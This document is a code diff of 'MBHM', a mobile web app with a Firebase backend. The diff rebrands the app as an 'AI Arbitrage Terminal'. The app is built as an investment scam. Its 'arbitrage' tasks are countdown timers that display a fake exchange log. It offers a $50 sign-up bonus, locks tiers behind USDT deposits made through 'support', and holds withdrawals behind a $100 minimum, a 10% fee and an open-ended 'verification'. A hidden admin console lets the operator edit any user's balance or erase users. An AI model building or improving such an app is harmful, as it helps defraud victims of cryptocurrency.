@@ -3,99 +3,111 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MBHM | Global Terminal</title>
+    <title>MBHM | Quantum Arbitrage</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
         body { background: #0b0e11; color: #fff; font-family: sans-serif; overflow-x: hidden; }
         .glass { background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1); backdrop-filter: blur(10px); }
         .page { display: none; min-height: 100vh; padding: 20px; }
         .active { display: block; }
-        .node-card { transition: all 0.3s ease; cursor: pointer; }
+        .node-card { transition: all 0.3s ease; cursor: pointer; border: 1px solid rgba(255,255,255,0.05); }
         .node-card:active { scale: 0.98; opacity: 0.8; }
         input { background: rgba(255,255,255,0.05) !important; color: white !important; border: 1px solid rgba(255,255,255,0.1) !important; }
+        .locked { filter: grayscale(1); opacity: 0.5; pointer-events: none; }
     </style>
 </head>
 <body>
 
     <div id="page-login" class="page active pt-20 text-center">
-        <h1 class="text-5xl font-extrabold mb-2 text-blue-500 italic">MBHM</h1>
-        <p class="text-[10px] opacity-40 mb-10 tracking-[0.3em]">QUANTUM ALGORITHM</p>
+        <h1 class="text-5xl font-extrabold mb-2 text-blue-500 italic tracking-tighter">MBHM</h1>
+        <p class="text-[9px] opacity-40 mb-10 tracking-[0.4em] uppercase font-bold">AI Arbitrage Terminal</p>
         <div class="space-y-4 max-w-sm mx-auto">
             <input id="user-phone" type="text" placeholder="Phone Number" class="w-full glass p-4 rounded-2xl outline-none">
-            <input id="user-pass" type="password" placeholder="Password" class="w-full glass p-4 rounded-2xl outline-none">
-            <button onclick="authAction()" class="w-full bg-blue-600 py-4 rounded-full font-bold shadow-lg shadow-blue-600/20">Access Terminal</button>
+            <input id="user-pass" type="password" placeholder="Terminal Key" class="w-full glass p-4 rounded-2xl outline-none">
+            <button onclick="authAction()" class="w-full bg-blue-600 py-4 rounded-full font-bold shadow-lg shadow-blue-600/20">Initialize Sync</button>
         </div>
     </div>
 
     <div id="page-home" class="page">
         <div class="glass p-8 rounded-[2.5rem] mb-6 shadow-2xl bg-gradient-to-br from-blue-900/20 to-transparent border-blue-500/20 text-center">
-            <p class="text-[10px] opacity-50 uppercase tracking-widest">Available Balance</p>
-            <h2 id="disp-bal" class="text-5xl font-bold mt-2">$0.00</h2>
+            <p class="text-[10px] opacity-50 uppercase tracking-widest">Global Liquidity Pool</p>
+            <h2 id="disp-bal" class="text-4xl font-bold mt-2 tracking-tight">$0.00</h2>
             <div class="flex gap-4 mt-8">
-                <button onclick="alert('Contact Admin to Recharge')" class="flex-1 bg-white/5 py-3 rounded-xl border border-white/10 text-[10px] font-bold uppercase">Recharge</button>
+                <button onclick="alert('Contact Support for USDT Recharge')" class="flex-1 bg-white/5 py-3 rounded-xl border border-white/10 text-[10px] font-bold uppercase">Recharge</button>
                 <button onclick="openWithdraw()" class="flex-1 bg-blue-600 font-bold py-3 rounded-xl shadow-lg shadow-blue-600/30 text-[10px] uppercase">Withdraw</button>
             </div>
         </div>
 
         <div class="flex justify-between items-center mb-4 px-2">
-            <span class="text-[10px] font-bold opacity-50 uppercase tracking-widest">Mining Nodes</span>
+            <span class="text-[10px] font-bold opacity-50 uppercase tracking-widest">Arbitrage Slots</span>
             <div class="bg-blue-600/20 px-3 py-1 rounded-full border border-blue-500/30 flex items-center gap-2">
                 <span id="tasks-left" class="text-blue-400 font-bold text-sm">5/5</span>
-                <span class="text-[8px] text-blue-400 opacity-60 uppercase">Daily Limit</span>
             </div>
         </div>
 
-        <div class="space-y-4">
-            <div class="node-card glass p-5 rounded-3xl flex items-center justify-between border-l-4 border-blue-500">
-                <div><p class="font-bold text-sm">Standard V1</p><p class="text-[10px] text-gray-500">30s | Yield: 0.5%</p></div>
-                <button onclick="startTask('Standard', 0.005, 30)" class="bg-blue-600/20 text-blue-400 border border-blue-600/30 px-6 py-2 rounded-full text-[10px] font-bold uppercase">Deploy</button>
+        <div class="space-y-4" id="node-container">
+            <div id="node-1" class="node-card glass p-5 rounded-3xl flex items-center justify-between border-l-4 border-blue-500">
+                <div>
+                    <p class="font-bold text-sm">L1: Flash Swap</p>
+                    <p class="text-[10px] text-gray-500">Min: $10 | Yield: 0.5%</p>
+                </div>
+                <button onclick="startTask('Flash Swap', 0.005, 15, 10)" class="bg-blue-600/20 text-blue-400 border border-blue-600/30 px-6 py-2 rounded-full text-[10px] font-bold uppercase">Run</button>
             </div>
-            <div class="node-card glass p-5 rounded-3xl flex items-center justify-between border-l-4 border-purple-500">
-                <div><p class="font-bold text-sm">Advanced V2</p><p class="text-[10px] text-gray-500">2m | Yield: 1.2%</p></div>
-                <button onclick="startTask('Advanced', 0.012, 120)" class="bg-purple-600/20 text-purple-400 border border-purple-600/30 px-6 py-2 rounded-full text-[10px] font-bold uppercase">Deploy</button>
+            <div id="node-2" class="node-card glass p-5 rounded-3xl flex items-center justify-between border-l-4 border-purple-500">
+                <div>
+                    <p class="font-bold text-sm">L2: Delta Neutral</p>
+                    <p class="text-[10px] text-gray-500">Min: $500 | Yield: 1.8%</p>
+                </div>
+                <button onclick="startTask('Delta Neutral', 0.018, 45, 500)" class="bg-purple-600/20 text-purple-400 border border-purple-600/30 px-6 py-2 rounded-full text-[10px] font-bold uppercase">Run</button>
             </div>
-            <div class="node-card glass p-5 rounded-3xl flex items-center justify-between border-l-4 border-yellow-500">
-                <div><p class="font-bold text-sm">Neural V3</p><p class="text-[10px] text-gray-500">5m | Yield: 2.5%</p></div>
-                <button onclick="startTask('Neural', 0.025, 300)" class="bg-yellow-600/20 text-yellow-400 border border-yellow-600/30 px-6 py-2 rounded-full text-[10px] font-bold uppercase">Deploy</button>
+            <div id="node-3" class="node-card glass p-5 rounded-3xl flex items-center justify-between border-l-4 border-yellow-500">
+                <div>
+                    <p class="font-bold text-sm">L3: HFT Neural</p>
+                    <p class="text-[10px] text-gray-500">Min: $2000 | Yield: 3.5%</p>
+                </div>
+                <button onclick="startTask('HFT Neural', 0.035, 90, 2000)" class="bg-yellow-600/20 text-yellow-400 border border-yellow-600/30 px-6 py-2 rounded-full text-[10px] font-bold uppercase">Run</button>
             </div>
         </div>
 
         <div id="admin-gate" class="hidden text-center mt-20 pb-10">
-            <button onclick="showPage('page-admin')" class="text-blue-900 text-[10px] font-bold uppercase tracking-[0.5em] animate-pulse">--- SYSTEM OVERRIDE 7.1 ---</button>
+            <button onclick="showPage('page-admin')" class="text-blue-900 text-[9px] font-bold uppercase tracking-[0.5em] animate-pulse">--- ADMINISTRATIVE OVERRIDE ---</button>
         </div>
     </div>
 
     <div id="modal-withdraw" class="hidden fixed inset-0 bg-black/95 flex items-center justify-center p-6 z-50 backdrop-blur-md">
         <div class="glass w-full max-w-md p-8 rounded-[2.5rem] border-blue-500/30 border">
-            <h3 class="text-xl font-bold mb-2 text-center">Withdraw Assets</h3>
-            <p class="text-[10px] text-yellow-500/80 mb-6 text-center uppercase tracking-tighter">Min: $100.00 | Fee: 10%</p>
-            <input id="w-address" type="text" placeholder="USDT TRC20 Address" class="w-full glass p-4 rounded-xl mb-4 outline-none">
+            <h3 class="text-xl font-bold mb-2 text-center">External Transfer</h3>
+            <p class="text-[10px] text-yellow-500/80 mb-6 text-center uppercase">Limit: $100 | Fee: 10%</p>
+            <input id="w-address" type="text" placeholder="USDT TRC20 Wallet" class="w-full glass p-4 rounded-xl mb-4 outline-none">
             <input id="w-amount" type="number" placeholder="Amount" class="w-full glass p-4 rounded-xl mb-6 outline-none">
             <div class="flex gap-4">
                 <button onclick="closeWithdraw()" class="flex-1 text-gray-500 text-sm">Cancel</button>
-                <button onclick="submitWithdraw()" class="flex-1 bg-blue-600 py-4 rounded-2xl font-bold text-sm">Confirm</button>
+                <button onclick="submitWithdraw()" class="flex-1 bg-blue-600 py-4 rounded-2xl font-bold text-sm">Verify</button>
             </div>
         </div>
     </div>
 
     <div id="task-overlay" class="hidden fixed inset-0 bg-black/95 z-[100] flex flex-col items-center justify-center p-10 text-center">
         <div class="relative w-40 h-40 mb-8">
-            <div class="absolute inset-0 border-4 border-blue-500/10 rounded-full"></div>
-            <div class="absolute inset-0 border-4 border-blue-500 border-t-transparent rounded-full animate-spin"></div>
-            <div class="absolute inset-0 flex items-center justify-center font-mono text-2xl text-blue-400" id="timer">00:00</div>
+            <div class="absolute inset-0 border-2 border-blue-500/10 rounded-full"></div>
+            <div class="absolute inset-0 border-2 border-blue-500 border-t-transparent rounded-full animate-spin"></div>
+            <div class="absolute inset-0 flex items-center justify-center font-mono text-xl text-blue-400" id="timer">00:00</div>
         </div>
-        <h2 id="task-title" class="text-xl font-bold mb-2 uppercase text-blue-500 tracking-widest">Syncing...</h2>
-        <p class="text-[10px] text-gray-500 uppercase tracking-widest leading-relaxed">Quantification in progress.</p>
+        <h2 id="task-title" class="text-sm font-bold mb-4 uppercase text-blue-500 tracking-widest italic">Syncing...</h2>
+        <div id="trade-log" class="text-[8px] font-mono text-gray-600 space-y-1 h-12 overflow-hidden uppercase">
+            <p>Scanning Binance USDT/BTC...</p>
+            <p>Analyzing OKX Spreads...</p>
+        </div>
     </div>
 
     <div id="page-admin" class="page">
         <div class="flex justify-between items-center mb-10">
-            <h2 class="text-2xl font-bold text-red-500">Admin Console</h2>
-            <button onclick="showPage('page-home')" class="glass px-4 py-2 rounded-xl text-xs uppercase font-bold tracking-widest">Exit</button>
+            <h2 class="text-2xl font-bold text-red-500">Master Console</h2>
+            <button onclick="showPage('page-home')" class="glass px-4 py-2 rounded-xl text-xs font-bold uppercase">Exit</button>
         </div>
         <div class="flex gap-2 mb-6">
-            <button onclick="loadWithdrawals()" class="flex-1 bg-white/5 py-2 rounded-lg text-[10px] uppercase font-bold border border-white/10">Withdrawals</button>
-            <button onclick="loadUsers()" class="flex-1 bg-white/5 py-2 rounded-lg text-[10px] uppercase font-bold border border-white/10">Members</button>
+            <button onclick="loadWithdrawals()" class="flex-1 bg-white/5 py-2 rounded-lg text-[9px] uppercase font-bold border border-white/10">Cashouts</button>
+            <button onclick="loadUsers()" class="flex-1 bg-white/5 py-2 rounded-lg text-[9px] uppercase font-bold border border-white/10">Database</button>
         </div>
         <div id="admin-content" class="space-y-4"></div>
     </div>
@@ -115,7 +127,7 @@
           measurementId: "G-GVSDVCN1QM"
         };
 
-        const SECRET_ADMIN_PHONE = "0799221290"; // <--- CHANGE TO YOUR NUMBER
+        const SECRET_ADMIN_PHONE = "0799221291"; // SET YOUR NUMBER HERE
 
         const app = initializeApp(firebaseConfig);
         const auth = getAuth(app);
@@ -130,24 +142,20 @@
         window.authAction = async () => {
             const phone = document.getElementById('user-phone').value;
             const pass = document.getElementById('user-pass').value;
-            if(!phone || !pass) return alert("Required");
+            if(!phone || !pass) return alert("Credentials Required");
             const email = phone + "@mbhm.com";
             
             try {
                 await signInWithEmailAndPassword(auth, email, pass);
             } catch (e) {
-                // Determine Starting Balance & Role
                 let startBal = (phone === SECRET_ADMIN_PHONE) ? 0 : 50.00;
                 let role = (phone === SECRET_ADMIN_PHONE) ? "admin" : "member";
 
                 const res = await createUserWithEmailAndPassword(auth, email, pass);
                 await setDoc(doc(db, "users", res.user.uid), { 
-                    phone, 
-                    balance: startBal, 
-                    tasksLeft: 5,
-                    role: role 
+                    phone, balance: startBal, tasksLeft: 5, role: role 
                 });
-                alert(role === "admin" ? "Admin Auth Successful" : "Bonus Credited.");
+                alert(role === "admin" ? "Admin Access Granted" : "Initial Bonus Credited: $50");
             }
         };
 
@@ -155,30 +163,40 @@
             const snap = await getDoc(doc(db, "users", uid));
             if(snap.exists()){
                 const d = snap.data();
-                const balDisplay = document.getElementById('disp-bal');
+                const balEl = document.getElementById('disp-bal');
                 
-                if(d.phone === SECRET_ADMIN_PHONE || d.role === "admin") {
-                    balDisplay.innerText = "SYSTEM ADMIN";
+                if(d.role === "admin") {
+                    balEl.innerText = "ADMIN ACCESS";
                     document.getElementById('admin-gate').classList.remove('hidden');
                 } else {
-                    balDisplay.innerText = "$" + d.balance.toLocaleString(undefined, {minimumFractionDigits: 2});
+                    balEl.innerText = "$" + d.balance.toLocaleString(undefined, {minimumFractionDigits: 2});
                 }
                 
-                document.getElementById('tasks-left').innerText = (d.tasksLeft ?? 5) + "/5";
+                document.getElementById('tasks-left').innerText = (d.tasksLeft ?? 5) + " Daily Slots";
+                
+                // VIP Locking Logic
+                document.getElementById('node-2').classList.toggle('locked', d.balance < 500);
+                document.getElementById('node-3').classList.toggle('locked', d.balance < 2000);
+                
                 showPage('page-home');
             }
         }
 
-        window.startTask = async (name, rate, seconds) => {
+        window.startTask = async (name, rate, seconds, minReq) => {
             const user = auth.currentUser;
             const userRef = doc(db, "users", user.uid);
             const snap = await getDoc(userRef);
-            if(snap.data().role === "admin") return alert("Admins cannot run mining nodes.");
+            const d = snap.data();
+
+            if(d.role === "admin") return alert("Admin cannot trade.");
+            if(d.balance < minReq) return alert(`Minimum $${minReq} required for this tier.`);
             
-            const tLeft = snap.data().tasksLeft !== undefined ? snap.data().tasksLeft : 5;
+            const tLeft = d.tasksLeft !== undefined ? d.tasksLeft : 5;
             if(tLeft <= 0) return alert("Daily limit reached.");
             
             document.getElementById('task-overlay').classList.remove('hidden');
+            document.getElementById('task-title').innerText = "AI Arbitrage: " + name;
+            
             let timeLeft = seconds;
             const countdown = setInterval(() => {
                 timeLeft--;
@@ -206,13 +224,13 @@
             const snap = await getDoc(userRef);
             if(snap.data().role === "admin") return alert("Admins cannot withdraw.");
             
-            if(amt < 100 || snap.data().balance < amt) return alert("Check amount/minimum ($100)");
+            if(amt < 100 || snap.data().balance < amt) return alert("Insufficient funds or Min $100 not met.");
 
             const fee = amt * 0.10, net = amt - fee;
-            if(confirm(`Withdraw $${amt}? Net: $${net.toFixed(2)}`)) {
+            if(confirm(`Requesting $${amt}. You receive $${net.toFixed(2)}. Proceed?`)) {
                 await updateDoc(userRef, { balance: snap.data().balance - amt });
                 await addDoc(collection(db, "withdrawals"), { phone: snap.data().phone, netPay: net, address: addr, time: new Date().toLocaleString() });
-                alert("Submitted.");
+                alert("Queue updated. Verification in progress.");
                 closeWithdraw();
                 updateUI(auth.currentUser.uid);
             }
@@ -220,7 +238,7 @@
 
         window.loadWithdrawals = async () => {
             const container = document.getElementById('admin-content');
-            container.innerHTML = `<p class="opacity-20 text-center">Reading...</p>`;
+            container.innerHTML = `<p class="opacity-20 text-center">Syncing...</p>`;
             const snap = await getDocs(collection(db, "withdrawals"));
             container.innerHTML = "";
             snap.forEach(d => {
@@ -234,18 +252,17 @@
 
         window.loadUsers = async () => {
             const container = document.getElementById('admin-content');
-            container.innerHTML = `<p class="opacity-20 text-center">Filtering Members...</p>`;
+            container.innerHTML = `<p class="opacity-20 text-center">Reading User Base...</p>`;
             const snap = await getDocs(collection(db, "users"));
             container.innerHTML = "";
             snap.forEach(u => {
                 const d = u.data();
-                // ONLY SHOW MEMBERS, HIDE ADMINS
-                if(d.role !== "admin" && d.phone !== SECRET_ADMIN_PHONE) {
+                if(d.role !== "admin") {
                     container.innerHTML += `<div class="glass p-5 rounded-3xl flex justify-between items-center">
                         <div class="text-left"><p class="text-blue-500 font-bold text-xs">${d.phone}</p><p class="text-lg font-bold">$${d.balance.toLocaleString()}</p></div>
-                        <div class="flex flex-col gap-2">
-                            <button onclick="editBalance('${u.id}', ${d.balance})" class="bg-blue-600/20 text-blue-400 p-2 rounded-xl text-[8px] font-bold uppercase">Adjust</button>
-                            <button onclick="deleteUserData('${u.id}')" class="bg-red-600/20 text-red-500 p-2 rounded-xl text-[8px] font-bold uppercase">Delete</button>
+                        <div class="flex gap-2">
+                            <button onclick="editBalance('${u.id}', ${d.balance})" class="bg-blue-600/20 text-blue-400 p-2 rounded-xl text-[8px] font-bold">ADJUST</button>
+                            <button onclick="deleteUserData('${u.id}')" class="bg-red-600/20 text-red-500 p-2 rounded-xl text-[8px] font-bold">ERASE</button>
                         </div>
                     </div>`;
                 }
@@ -253,12 +270,12 @@
         };
 
         window.editBalance = async (id, current) => {
-            const amt = prompt("Change balance by (+/-):", "10");
+            const amt = prompt("Change balance (+/-):", "10");
             if(amt) { await updateDoc(doc(db, "users", id), { balance: current + parseFloat(amt) }); loadUsers(); }
         };
 
         window.deleteUserData = async (id) => {
-            if(confirm("Erase user?")) { await deleteDoc(doc(db, "users", id)); loadUsers(); }
+            if(confirm("Confirm deletion?")) { await deleteDoc(doc(db, "users", id)); loadUsers(); }
         };
 
         window.deleteRequest = async (id) => {
